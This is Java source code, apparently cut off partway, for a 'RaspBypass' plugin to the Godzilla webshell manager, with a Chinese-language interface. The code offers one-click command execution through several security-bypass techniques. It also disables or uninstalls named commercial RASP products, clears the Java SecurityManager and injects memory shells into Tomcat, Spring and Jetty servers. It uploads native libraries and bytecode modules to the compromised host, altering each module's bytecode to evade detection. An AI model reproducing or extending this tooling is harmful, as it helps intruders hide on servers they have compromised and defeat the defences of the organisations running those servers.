//
// RASP Bypass Plugin for Godzilla
//
package shells.plugins.java;

import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.GridLayout;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import javax.swing.BorderFactory;
import javax.swing.Box;
import javax.swing.BoxLayout;
import javax.swing.ButtonGroup;
import javax.swing.Icon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JComponent;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JTabbedPane;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.border.EmptyBorder;
import org.fife.ui.rtextarea.RTextScrollPane;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

@PluginAnnotation(
    payloadName = "JavaDynamicPayload",
    Name = "RaspBypass",
    DisplayName = "RASP\u7ed5\u8fc7"
)
public class RaspBypass implements Plugin {

    private static final int GAP = 8;
    private static final Insets TAB_INSETS = new Insets(12, 14, 12, 14);

    private ShellEntity shellEntity;
    private Payload payload;
    private boolean moduleReady = false;
    private boolean moduleResourceMissing = false;
    private boolean moduleMissingHintBroadcast = false;

    private JPanel corePanel;
    private JTabbedPane tabbedPane;
    private JTabbedPane advancedTabs;
    private JLabel statusLabel;
    private JButton refreshDiagButton;

    private JTextField cmdTextField;
    private JButton execButton;
    private RTextArea resultTextArea;
    private JComboBox<String> bypassMethodCombo;
    private JCheckBox autoDetectCheckBox;
    private JCheckBox forceSingleCheckBox;

    private JComboBox<String> raspTypeCombo;
    private JButton disableRaspButton;
    private JButton checkRaspButton;
    private RTextArea raspResultTextArea;
    private JRadioButton disableHookRadio;
    private JRadioButton modifyConfigRadio;
    private JRadioButton uninstallRadio;
    private JButton universalDisableButton;
    private JButton uninstallRaspButton;
    private JButton clearSecurityManagerButton;
    private JButton opsEnvironmentButton;

    private JComboBox<String> memShellTypeCombo;
    private JButton injectMemShellButton;
    private JButton removeMemShellButton;
    private JTextField memShellPathTextField;
    private RTextArea memShellResultTextArea;

    private JTextField jniSoPathTextField;
    private JButton loadJniButton;
    private JButton execJniButton;
    private RTextArea jniResultTextArea;
    private JTextField jniCmdTextField;

    private JButton copyBashButton;
    private JButton createLinkButton;
    private JTextField sourcePathTextField;
    private JTextField destPathTextField;
    private RTextArea toolsResultTextArea;

    private static final String[] BYPASS_METHODS = {
        "0 \u81ea\u52a8\u63a2\u6d4b\uff08\u63a8\u8350\uff1a\u5148\u8f6f\u964d\u7ea7\u518d\u666e\u901a\u6267\u884c\u518d\u6df1\u94fe\uff09",
        "1 Unsafe.allocateInstance + forkAndExec",
        "2 JNI \u539f\u751f\u6267\u884c",
        "3 \u65b0\u7ebf\u7a0b\u7ed5\u8fc7",
        "4 GC finalize \u7ed5\u8fc7",
        "5 ProcessImpl \u76f4\u8c03",
        "6 Tomcat-JNI",
        "7 \u53cd\u5c04\u7ed5\u8fc7",
        "8 ForkAndExec \u76f4\u8c03"
    };

    private static final String[] RASP_TYPES = {
        "OpenRASP\uff08\u767e\u5ea6\uff09",
        "JRASP",
        "Elkeid\uff08\u5b57\u8282\u8df3\u52a8\uff09",
        "QingTeng\uff08\u9752\u85e4\u4e91\uff09",
        "Tencent RASP\uff08\u817e\u8baf\u4e91\uff09",
        "Aliyun RASP\uff08\u963f\u91cc\u4e91\uff09",
        "Custom RASP\uff08\u5176\u4ed6\u00b7\u901a\u7528\uff09"
    };

    private static final String[] MEM_SHELL_TYPES = {
        "Tomcat Filter\uff08Tomcat \u8fc7\u6ee4\u5668\uff09",
        "Tomcat Servlet\uff08Servlet\uff09",
        "Tomcat Listener\uff08\u76d1\u542c\u5668\uff09",
        "Spring Controller\uff08Spring \u63a7\u5236\u5668\uff09",
        "Jetty Filter\uff08Jetty \u8fc7\u6ee4\u5668\uff09",
        "VM Anonymous Class\uff08\u533f\u540d\u7c7b\uff09"
    };

    private static final Dimension SCROLL_MIN = new Dimension(200, 200);
    private static final int LABEL_MIN_WIDTH = 140;

    public RaspBypass() {
        $$$setupUI$$$();
    }

    /** Module / evalFunc text is always UTF-8 (see RaspBypassModule). */
    private static String utf8(byte[] bytes) {
        if (bytes == null) {
            return "";
        }
        return new String(bytes, StandardCharsets.UTF_8);
    }

    /** \u9876\u90e8\u5206\u7ec4\uff08\u51f9\u7ebf\u6807\u9898\uff09 */
    private static JPanel titledFormNorth(JComponent inner, String title) {
        JPanel wrap = new JPanel(new BorderLayout());
        wrap.setBorder(BorderFactory.createCompoundBorder(
            BorderFactory.createTitledBorder(BorderFactory.createEtchedBorder(), title),
            new EmptyBorder(2, 6, 6, 6)));
        wrap.add(inner, BorderLayout.NORTH);
        return wrap;
    }

    /** \u56de\u663e\u533a\uff1a\u7b49\u5bbd\u5b57\u4f53 + \u8fb9\u6846 */
    private void mountOutputPane(JPanel tabPanel, RTextArea area) {
        RTextScrollPane scrollPane = new RTextScrollPane();
        scrollPane.setViewportView(area);
        scrollPane.setMinimumSize(SCROLL_MIN);
        Font base = area.getFont();
        if (base == null) {
            base = UIManager.getFont("TextArea.font");
        }
        if (base != null) {
            area.setFont(new Font(Font.MONOSPACED, base.getStyle(), base.getSize()));
        } else {
            area.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
        }
        scrollPane.setBorder(BorderFactory.createCompoundBorder(
            BorderFactory.createTitledBorder(
                BorderFactory.createEtchedBorder(),
                "\u56de\u663e / \u8f93\u51fa"),
            new EmptyBorder(4, 6, 6, 6)));
        tabPanel.add(scrollPane, BorderLayout.CENTER);
    }

    /** \u6807\u7b7e+\u63a7\u4ef6\u540c\u884c\uff1b\u6807\u7b7e\u6700\u5c0f\u5bbd\u5ea6\u7edf\u4e00\uff0c\u5217\u5bf9\u9f50\u3002 */
    private static JPanel formRow(JLabel label, JComponent field) {
        JPanel row = new JPanel(new BorderLayout(10, 0));
        row.setOpaque(false);
        row.setAlignmentX(Component.LEFT_ALIGNMENT);
        Dimension lp = label.getPreferredSize();
        int lw = Math.max(LABEL_MIN_WIDTH, lp.width);
        label.setPreferredSize(new Dimension(lw, lp.height));
        label.setMinimumSize(new Dimension(lw, lp.height));
        int h = Math.max(28, Math.max(lp.height, field.getPreferredSize().height) + 6);
        row.setMaximumSize(new Dimension(Integer.MAX_VALUE, h));
        row.add(label, BorderLayout.WEST);
        row.add(field, BorderLayout.CENTER);
        return row;
    }

    private static JPanel leftFlowRow(Component... items) {
        JPanel row = new JPanel(new FlowLayout(FlowLayout.LEFT, GAP, 0));
        row.setAlignmentX(Component.LEFT_ALIGNMENT);
        row.setOpaque(false);
        row.setMaximumSize(new Dimension(Integer.MAX_VALUE, 40));
        for (Component c : items) {
            row.add(c);
        }
        return row;
    }


    private void $$$setupUI$$$() {
        this.corePanel = new JPanel(new BorderLayout());
        this.corePanel.setBorder(new EmptyBorder(6, 8, 8, 8));

        JPanel statusBar = new JPanel(new BorderLayout(8, 0));
        statusBar.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createEtchedBorder(),
                new EmptyBorder(6, 8, 6, 8)));
        this.statusLabel = new JLabel("\u72b6\u6001: \u672a\u8bca\u65ad \u2014 \u70b9\u300c\u8bca\u65ad\u300d\u5237\u65b0\u73af\u5883\uff0c\u6216\u76f4\u63a5\u4e00\u952e\u6267\u884c");
        this.refreshDiagButton = new JButton("\u5237\u65b0\u8bca\u65ad");
        this.refreshDiagButton.setToolTipText("opsEnvironment + checkRasp");
        statusBar.add(this.statusLabel, BorderLayout.CENTER);
        statusBar.add(this.refreshDiagButton, BorderLayout.EAST);
        this.corePanel.add(statusBar, BorderLayout.NORTH);

        this.tabbedPane = new JTabbedPane();
        this.tabbedPane.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT);
        this.corePanel.add(this.tabbedPane, BorderLayout.CENTER);

        this.bypassMethodCombo = new JComboBox<>(BYPASS_METHODS);
        this.bypassMethodCombo.setToolTipText("\u9ad8\u7ea7\u5355\u7b56\u7565\u65f6\u4f7f\u7528\uff1b\u4e00\u952e\u6a21\u5f0f\u8d70\u7ba1\u7ebf");
        this.autoDetectCheckBox = new JCheckBox("\u7ba1\u7ebf Detect\u2192Plan\u2192Exec\u2192Verify\uff08\u63a8\u8350\uff09");
        this.autoDetectCheckBox.setSelected(true);
        this.forceSingleCheckBox = new JCheckBox("\u5f3a\u5236\u5355\u7b56\u7565\uff08\u7528\u4e0b\u62c9\uff09");
        this.forceSingleCheckBox.setSelected(false);
        this.cmdTextField = new JTextField("whoami");
        this.execButton = new JButton("\u4e00\u952e\u6267\u884c");
        this.resultTextArea = new RTextArea();
        this.raspResultTextArea = new RTextArea();
        this.memShellResultTextArea = new RTextArea();
        this.jniResultTextArea = new RTextArea();
        this.toolsResultTextArea = new RTextArea();

        createDiagnoseTab();
        createOneClickTab();
        createAdvancedTab();
        this.tabbedPane.setSelectedIndex(1);
    }

    private void createDiagnoseTab() {
        JPanel panel = new JPanel(new BorderLayout(0, 10));
        panel.setBorder(new EmptyBorder(TAB_INSETS));
        JPanel form = new JPanel();
        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
        form.setOpaque(false);
        this.opsEnvironmentButton = new JButton("\u73af\u5883\u6307\u7eb9 + PLAN");
        this.checkRaspButton = new JButton("\u68c0\u67e5 RASP \u5382\u5546");
        JButton smartAdvisorButton = new JButton("\u667a\u80fd\u5efa\u8bae");
        smartAdvisorButton.addActionListener(e -> smartAdvisorButtonClick(e));
        form.add(leftFlowRow(this.opsEnvironmentButton, this.checkRaspButton, smartAdvisorButton));
        form.add(Box.createVerticalStrut(8));
        JLabel hint = new JLabel("<html>\u8bca\u65ad\u53ea\u8bfb\u53d6\u73af\u5883\uff0c\u4e0d\u6267\u884c\u5371\u9669\u547d\u4ee4\u3002\u5b8c\u6210\u540e\u5230\u300c\u4e00\u952e\u6267\u884c\u300d\u3002Disable/\u5185\u5b58\u9a6c\u5728\u300c\u9ad8\u7ea7\u300d\u3002</html>");
        hint.setAlignmentX(Component.LEFT_ALIGNMENT);
        form.add(hint);
        panel.add(titledFormNorth(form, "\u8bca\u65ad\u4e0e\u89c4\u5212"), BorderLayout.NORTH);
        mountOutputPane(panel, this.raspResultTextArea);
        this.tabbedPane.addTab("\u8bca\u65ad", (Icon) null, panel, "Detect + Plan");
    }

    private void createOneClickTab() {
        JPanel panel = new JPanel(new BorderLayout(0, 10));
        panel.setBorder(new EmptyBorder(TAB_INSETS));
        JPanel form = new JPanel();
        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
        form.setOpaque(false);
        this.autoDetectCheckBox.setAlignmentX(Component.LEFT_ALIGNMENT);
        this.forceSingleCheckBox.setAlignmentX(Component.LEFT_ALIGNMENT);
        form.add(this.autoDetectCheckBox);
        form.add(Box.createVerticalStrut(4));
        form.add(this.forceSingleCheckBox);
        form.add(Box.createVerticalStrut(6));
        form.add(formRow(new JLabel("\u5355\u7b56\u7565\uff08\u4ec5\u5f3a\u5236\u65f6\uff09\uff1a"), this.bypassMethodCombo));
        form.add(Box.createVerticalStrut(6));
        form.add(formRow(new JLabel("\u547d\u4ee4\uff1a"), this.cmdTextField));
        form.add(Box.createVerticalStrut(8));
        form.add(leftFlowRow(this.execButton));
        panel.add(titledFormNorth(form, "Detect \u2192 Plan \u2192 Exec \u2192 Verify"), BorderLayout.NORTH);
        mountOutputPane(panel, this.resultTextArea);
        this.tabbedPane.addTab("\u4e00\u952e\u6267\u884c", (Icon) null, panel, "Pipeline");
    }

    private void createAdvancedTab() {
        this.advancedTabs = new JTabbedPane();
        this.advancedTabs.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT);
        this.advancedTabs.addTab("RASP \u7981\u7528", createRaspDisablePanel());
        this.advancedTabs.addTab("\u5185\u5b58\u9a6c", createMemoryShellPanel());
        this.advancedTabs.addTab("JNI", createJniPanel());
        this.advancedTabs.addTab("\u5de5\u5177", createToolsPanel());
        JPanel wrap = new JPanel(new BorderLayout());
        wrap.setBorder(new EmptyBorder(4, 4, 4, 4));
        wrap.add(this.advancedTabs, BorderLayout.CENTER);
        this.tabbedPane.addTab("\u9ad8\u7ea7", (Icon) null, wrap, "Disable / Memshell / JNI / Tools");
    }

    private JPanel createRaspDisablePanel() {
        JPanel panel = new JPanel(new BorderLayout(0, 10));
        panel.setBorder(new EmptyBorder(TAB_INSETS));
        JPanel form = new JPanel();
        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
        form.setOpaque(false);
        this.raspTypeCombo = new JComboBox<>(RASP_TYPES);
        form.add(formRow(new JLabel("RASP \u7c7b\u578b\uff1a"), this.raspTypeCombo));
        form.add(Box.createVerticalStrut(6));
        JPanel radioPanel = new JPanel();
        radioPanel.setLayout(new BoxLayout(radioPanel, BoxLayout.Y_AXIS));
        radioPanel.setAlignmentX(Component.LEFT_ALIGNMENT);
        radioPanel.setOpaque(false);
        radioPanel.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createTitledBorder(BorderFactory.createEtchedBorder(), "\u64cd\u4f5c\u6a21\u5f0f"),
                new EmptyBorder(4, 6, 6, 6)));
        this.disableHookRadio = new JRadioButton("\u5173\u95ed Hook");
        this.disableHookRadio.setSelected(true);
        this.modifyConfigRadio = new JRadioButton("\u4fee\u6539\u914d\u7f6e");
        this.uninstallRadio = new JRadioButton("\u5378\u8f7d\u63a2\u9488");
        ButtonGroup group = new ButtonGroup();
        group.add(this.disableHookRadio);
        group.add(this.modifyConfigRadio);
        group.add(this.uninstallRadio);
        this.disableHookRadio.setAlignmentX(Component.LEFT_ALIGNMENT);
        this.modifyConfigRadio.setAlignmentX(Component.LEFT_ALIGNMENT);
        this.uninstallRadio.setAlignmentX(Component.LEFT_ALIGNMENT);
        radioPanel.add(this.disableHookRadio);
        radioPanel.add(Box.createVerticalStrut(4));
        radioPanel.add(this.modifyConfigRadio);
        radioPanel.add(Box.createVerticalStrut(4));
        radioPanel.add(this.uninstallRadio);
        form.add(radioPanel);
        form.add(Box.createVerticalStrut(8));
        this.disableRaspButton = new JButton("\u7981\u7528 RASP");
        this.universalDisableButton = new JButton("\u901a\u7528\u7981\u7528");
        this.uninstallRaspButton = new JButton("\u5378\u8f7d RASP");
        this.clearSecurityManagerButton = new JButton("\u6e05\u9664 SecurityManager");
        JPanel btnGrid = new JPanel(new GridLayout(2, 2, GAP, GAP));
        btnGrid.setAlignmentX(Component.LEFT_ALIGNMENT);
        btnGrid.setMaximumSize(new Dimension(Integer.MAX_VALUE, 100));
        btnGrid.add(this.disableRaspButton);
        btnGrid.add(this.universalDisableButton);
        btnGrid.add(this.uninstallRaspButton);
        btnGrid.add(this.clearSecurityManagerButton);
        form.add(btnGrid);
        panel.add(titledFormNorth(form, "\u7981\u7528\uff08\u4e0d\u8d70\u81ea\u52a8\u7ba1\u7ebf\uff09"), BorderLayout.NORTH);
        mountOutputPane(panel, this.raspResultTextArea);
        return panel;
    }

    private JPanel createMemoryShellPanel() {
        JPanel panel = new JPanel(new BorderLayout(0, 10));
        panel.setBorder(new EmptyBorder(TAB_INSETS));
        JPanel form = new JPanel();
        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
        form.setOpaque(false);
        this.memShellTypeCombo = new JComboBox<>(MEM_SHELL_TYPES);
        form.add(formRow(new JLabel("\u7c7b\u578b\uff1a"), this.memShellTypeCombo));
        form.add(Box.createVerticalStrut(6));
        this.memShellPathTextField = new JTextField("/shell");
        form.add(formRow(new JLabel("URL\uff1a"), this.memShellPathTextField));
        form.add(Box.createVerticalStrut(8));
        this.injectMemShellButton = new JButton("\u6ce8\u5165");
        this.removeMemShellButton = new JButton("\u79fb\u9664");
        form.add(leftFlowRow(this.injectMemShellButton, this.removeMemShellButton));
        panel.add(titledFormNorth(form, "\u5185\u5b58\u9a6c"), BorderLayout.NORTH);
        mountOutputPane(panel, this.memShellResultTextArea);
        return panel;
    }

    private JPanel createJniPanel() {
        JPanel panel = new JPanel(new BorderLayout(0, 10));
        panel.setBorder(new EmptyBorder(TAB_INSETS));
        JPanel form = new JPanel();
        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
        form.setOpaque(false);
        this.jniSoPathTextField = new JTextField("");
        this.jniSoPathTextField.setToolTipText("\u53ef\u7a7a\uff1b\u7a7a\u5219\u670d\u52a1\u7aef\u6309\u5185\u7f6e\u540d\u52a0\u8f7d");
        form.add(formRow(new JLabel("SO/DLL\uff1a"), this.jniSoPathTextField));
        form.add(Box.createVerticalStrut(4));
        this.loadJniButton = new JButton("\u52a0\u8f7d JNI");
        form.add(leftFlowRow(this.loadJniButton));
        form.add(Box.createVerticalStrut(8));
        this.jniCmdTextField = new JTextField("id");
        form.add(formRow(new JLabel("\u547d\u4ee4\uff1a"), this.jniCmdTextField));
        form.add(Box.createVerticalStrut(8));
        this.execJniButton = new JButton("JNI \u6267\u884c");
        form.add(leftFlowRow(this.execJniButton));
        panel.add(titledFormNorth(form, "JNI"), BorderLayout.NORTH);
        mountOutputPane(panel, this.jniResultTextArea);
        return panel;
    }

    private JPanel createToolsPanel() {
        JPanel panel = new JPanel(new BorderLayout(0, 10));
        panel.setBorder(new EmptyBorder(TAB_INSETS));
        JPanel form = new JPanel();
        form.setLayout(new BoxLayout(form, BoxLayout.Y_AXIS));
        form.setOpaque(false);
        this.sourcePathTextField = new JTextField("/bin/bash");
        form.add(formRow(new JLabel("\u6e90\uff1a"), this.sourcePathTextField));
        form.add(Box.createVerticalStrut(6));
        this.destPathTextField = new JTextField("/tmp/glassy");
        form.add(formRow(new JLabel("\u76ee\u6807\uff1a"), this.destPathTextField));
        form.add(Box.createVerticalStrut(8));
        this.copyBashButton = new JButton("\u590d\u5236\u4e8c\u8fdb\u5236");
        this.createLinkButton = new JButton("\u7b26\u53f7\u94fe\u63a5");
        form.add(leftFlowRow(this.copyBashButton, this.createLinkButton));
        panel.add(titledFormNorth(form, "\u8def\u5f84\u5de5\u5177"), BorderLayout.NORTH);
        mountOutputPane(panel, this.toolsResultTextArea);
        return panel;
    }

    public JComponent $$$getRootComponent$$$() {
        return this.corePanel;
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        automaticBindClick.bindJButtonClick(this, this);
        if (this.refreshDiagButton != null) {
            this.refreshDiagButton.addActionListener(e -> refreshDiagButtonClick(e));
        }
        updateStatusBar("\u5c31\u7eea\uff08\u672a\u8bca\u65ad\uff09");
    }

    private void updateStatusBar(String msg) {
        if (this.statusLabel != null) {
            this.statusLabel.setText("\u72b6\u6001: " + msg);
        }
    }

    private void refreshDiagButtonClick(ActionEvent event) {
        if (this.tabbedPane != null) {
            this.tabbedPane.setSelectedIndex(0);
        }
        opsEnvironmentButtonClick(event);
    }

    private void applyPipelineMetaToStatus(String strResult) {
        if (strResult == null) {
            return;
        }
        int meta = strResult.lastIndexOf("<!--RASP_META:");
        if (meta < 0) {
            return;
        }
        int endMeta = strResult.indexOf("-->", meta);
        if (endMeta < 0) {
            return;
        }
        String body = strResult.substring(meta + "<!--RASP_META:".length(), endMeta).trim();
        String summary = body.replace('{', ' ').replace('}', ' ').replace('"', ' ').trim();
        if (summary.length() > 160) {
            summary = summary.substring(0, 160) + "...";
        }
        updateStatusBar(summary);
    }

    @Override
    public JPanel getView() {
        return this.corePanel;
    }


    /** Read embedded rasp_bypass_*.dll/so for upload to target. */
    private byte[] readEmbeddedNativeLib() {
        String os = System.getProperty("os.name", "").toLowerCase();
        String name;
        if (os.contains("win")) {
            name = "rasp_bypass_win_x64.dll";
        } else if (os.contains("mac") || os.contains("darwin")) {
            name = "rasp_bypass_mac.so";
        } else {
            name = "rasp_bypass_linux_x64.so";
        }
        InputStream in = openPluginAsset(name.replace(".dll", "").replace(".so", ""));
        // openPluginAsset appends .classs/.class \u2014 use direct resource for dll
        in = getClass().getResourceAsStream("assets/" + name);
        if (in == null) {
            java.lang.ClassLoader cl = RaspBypass.class.getClassLoader();
            if (cl != null) {
                in = cl.getResourceAsStream("shells/plugins/java/assets/" + name);
            }
        }
        if (in == null) {
            return null;
        }
        try {
            return functions.readInputStreamAutoClose(in);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    private void attachNativeLibBytes(ReqParameter params) {
        if (params == null) {
            return;
        }
        // Prefer target OS (shell payload), not the operator workstation OS.
        byte[] lib = readEmbeddedNativeLibForTarget();
        if (lib != null && lib.length > 0) {
            params.add("libBytes", lib);
            params.add("libName", targetNativeLibName());
        }
    }

    private boolean targetIsWindows() {
        try {
            if (this.payload != null) {
                return this.payload.isWindows();
            }
        } catch (Throwable ignored) {
        }
        return System.getProperty("os.name", "").toLowerCase().contains("win");
    }

    private boolean targetIsX64() {
        try {
            if (this.payload != null) {
                return this.payload.isX64();
            }
        } catch (Throwable ignored) {
        }
        String arch = System.getProperty("os.arch", "").toLowerCase();
        return arch.contains("64") || arch.contains("amd64") || arch.contains("x86_64");
    }

    private String targetNativeLibName() {
        if (targetIsWindows()) {
            return targetIsX64() ? "rasp_bypass_win_x64.dll" : "rasp_bypass_win_x86.dll";
        }
        String os = "";
        try {
            if (this.payload != null && this.payload.getOsInfo() != null) {
                os = this.payload.getOsInfo().toLowerCase();
            }
        } catch (Throwable ignored) {
        }
        if (os.contains("mac") || os.contains("darwin")) {
            return "rasp_bypass_mac.so";
        }
        return targetIsX64() ? "rasp_bypass_linux_x64.so" : "rasp_bypass_linux_x86.so";
    }

    private byte[] readEmbeddedNativeLibForTarget() {
        String name = targetNativeLibName();
        byte[] lib = readEmbeddedNativeByName(name);
        if (lib != null && lib.length > 0) {
            return lib;
        }
        // fallback chain for missing arch-specific builds
        if (targetIsWindows()) {
            return readEmbeddedNativeByName("rasp_bypass_win_x64.dll");
        }
        lib = readEmbeddedNativeByName("rasp_bypass_linux_x64.so");
        if (lib != null) {
            return lib;
        }
        return readEmbeddedNativeLib();
    }

    private byte[] readEmbeddedNativeByName(String name) {
        if (name == null || name.isEmpty()) {
            return null;
        }
        InputStream in = getClass().getResourceAsStream("assets/" + name);
        if (in == null) {
            java.lang.ClassLoader cl = RaspBypass.class.getClassLoader();
            if (cl != null) {
                in = cl.getResourceAsStream("shells/plugins/java/assets/" + name);
            }
        }
        if (in == null) {
            return null;
        }
        try {
            return functions.readInputStreamAutoClose(in);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    private InputStream openPluginAsset(String fileName) {
        // Prefer .classs (Godzilla package suffix), then plain .class
        String[] rel = new String[]{
                "assets/" + fileName + ".classs",
                "assets/" + fileName + ".class"
        };
        for (String r : rel) {
            InputStream in = getClass().getResourceAsStream(r);
            if (in != null) {
                return in;
            }
            java.lang.ClassLoader cl = RaspBypass.class.getClassLoader();
            if (cl != null) {
                in = cl.getResourceAsStream("shells/plugins/java/" + r);
                if (in != null) {
                    return in;
                }
            }
        }
        return null;
    }

    private InputStream openRaspBypassModuleResource() {
        InputStream in = openPluginAsset("RaspBypassModule");
        if (in != null) {
            return in;
        }
        try {
            URL url = getClass().getProtectionDomain() != null && getClass().getProtectionDomain().getCodeSource() != null
                ? getClass().getProtectionDomain().getCodeSource().getLocation() : null;
            if (url != null) {
                Log.log("RaspBypass: RaspBypassModule.classs not on classpath (jar/dir: %s)", new Object[]{url});
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    /** Upload RaspBypassModule$1..$N used by anonymous classes (memshell / threads). */
    private void includeModuleInners() {
        for (int i = 1; i <= 16; i++) {
            String simple = "RaspBypassModule$" + i;
            InputStream in = openPluginAsset(simple);
            if (in == null) {
                if (i == 1) {
                    // no inners packaged
                    return;
                }
                break;
            }
            try {
                byte[] bytes = functions.readInputStreamAutoClose(in);
                if (bytes == null || bytes.length == 0) {
                    continue;
                }
                // Do not ASM-rename inners: binary refs from outer class
                boolean ok = this.payload.include(simple, bytes);
                Log.log("RaspBypass include inner " + simple + ": " + ok);
            } catch (Exception e) {
                Log.error("include inner " + simple + ": " + e.getMessage());
            }
        }
    }

    private void broadcastModuleHint(String hint) {
        if (this.moduleMissingHintBroadcast) {
            return;
        }
        this.moduleMissingHintBroadcast = true;
        this.resultTextArea.append(hint);
        this.raspResultTextArea.append(hint);
        this.memShellResultTextArea.append(hint);
        this.jniResultTextArea.append(hint);
        this.toolsResultTextArea.append(hint);
    }

    private boolean loadModule() {
        if (this.moduleReady) {
            return true;
        }
        if (this.moduleResourceMissing) {
            return false;
        }
        try {
            // Prefer lightweight ping; fall back to opsEnvironment for older modules
            try {
                byte[] testRes = this.payload.evalFunc("RaspBypassModule", "ping", new ReqParameter());
                String p = testRes == null ? "" : utf8(testRes);
                if (p.contains("pong") || (testRes != null && testRes.length > 0 && !p.toLowerCase().contains("error"))) {
                    Log.log("RaspBypassModule is already cached on target loader (ping).");
                    this.moduleReady = true;
                    return true;
                }
            } catch (Exception ignoredPing) {
                try {
                    byte[] testRes = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
                    if (testRes != null && testRes.length > 0) {
                        Log.log("RaspBypassModule is already cached on target loader.");
                        this.moduleReady = true;
                        return true;
                    }
                } catch (Exception ignored) {
                    // Not cached or error, proceed to upload
                }
            }

            InputStream in = openRaspBypassModuleResource();
            if (in == null) {
                this.moduleResourceMissing = true;
                String hint = "\u672a\u627e\u5230 assets/RaspBypassModule.classs\uff0c\u8bf7\u5728\u9879\u76ee\u6839\u76ee\u5f55\u8fd0\u884c compile_rasp_bypass.bat \u751f\u6210\u540e\u518d\u6253\u5305\u3002\n";
                Log.error("RaspBypass: " + hint.trim());
                broadcastModuleHint(hint);
                return false;
            }
            byte[] moduleBytes = functions.readInputStreamAutoClose(in);
            if (moduleBytes == null || moduleBytes.length == 0) {
                this.moduleResourceMissing = true;
                String hint = "RaspBypassModule.classs \u4e3a\u7a7a\uff0c\u8bf7\u91cd\u65b0\u7f16\u8bd1\u6a21\u5757\u3002\n";
                Log.error("RaspBypass: " + hint.trim());
                broadcastModuleHint(hint);
                return false;
            }
            
            // Polymorphic ASM Obfuscation (outer only; never rename FQN / break inner refs)
            try {
                moduleBytes = obfuscateModule(moduleBytes);
            } catch (Exception asmEx) {
                Log.error("ASM Obfuscation failed: " + asmEx.getMessage());
            }

            // Inners first so outer linkage can resolve anonymous classes
            includeModuleInners();
            // Helper for native load (optional)
            try {
                InputStream loaderIn = openPluginAsset("RaspNativeLoader");
                if (loaderIn != null) {
                    byte[] lb = functions.readInputStreamAutoClose(loaderIn);
                    if (lb != null && lb.length > 0) {
                        boolean lok = this.payload.include("RaspNativeLoader", lb);
                        Log.log("RaspNativeLoader include: " + lok);
                    }
                }
            } catch (Exception ex) {
                Log.error("RaspNativeLoader include: " + ex.getMessage());
            }
            try {
                InputStream planIn = openPluginAsset("RaspDetectPlan");
                if (planIn != null) {
                    byte[] pb = functions.readInputStreamAutoClose(planIn);
                    if (pb != null && pb.length > 0) {
                        boolean pok = this.payload.include("RaspDetectPlan", pb);
                        Log.log("RaspDetectPlan include: " + pok);
                    }
                }
            } catch (Exception ex) {
                Log.error("RaspDetectPlan include: " + ex.getMessage());
            }


            this.moduleReady = this.payload.include("RaspBypassModule", moduleBytes);
            Log.log("RaspBypassModule include: " + this.moduleReady);
            if (!this.moduleReady) {
                String hint = "\u670d\u52a1\u7aef include RaspBypassModule \u5931\u8d25\uff0c\u8bf7\u67e5\u770b\u65e5\u5fd7\u6216\u91cd\u8bd5\u8fde\u63a5\u3002\n";
                this.resultTextArea.append(hint);
            }
            return this.moduleReady;
        } catch (Exception e) {
            Log.error(e);
            this.resultTextArea.append("\u52a0\u8f7d\u6a21\u5757\u5f02\u5e38: " + e.getMessage() + "\n");
            return false;
        }
    }
    
    private byte[] obfuscateModule(byte[] originalBytes) {
        ClassReader cr = new ClassReader(originalBytes);
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        
        ClassVisitor cv = new ClassVisitor(Opcodes.ASM5, cw) {
            @Override
            public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
                super.visit(version, access, name, signature, superName, interfaces);
                // Add a random field
                String randomFieldName = "gsl_" + System.currentTimeMillis();
                super.visitField(Opcodes.ACC_PRIVATE, randomFieldName, "Ljava/lang/String;", null, null).visitEnd();
            }

            @Override
            public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                return new MethodVisitor(Opcodes.ASM5, mv) {
                    @Override
                    public void visitCode() {
                        super.visitCode();
                        // Insert random NOP instructions for bytecode morphism
                        super.visitInsn(Opcodes.NOP);
                        if (Math.random() > 0.5) {
                            super.visitInsn(Opcodes.NOP);
                        }
                    }
                };
            }
        };
        
        cr.accept(cv, 0);
        return cw.toByteArray();
    }
    
    private void smartAdvisorButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff0c\u65e0\u6cd5\u6267\u884c\u667a\u80fd\u5206\u6790\uff01\n");
            return;
        }
        
        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u542f\u52a8\u667a\u80fd RASP/EDR \u8bca\u65ad\u4e0e\u5efa\u8bae\u5f15\u64ce...\n");
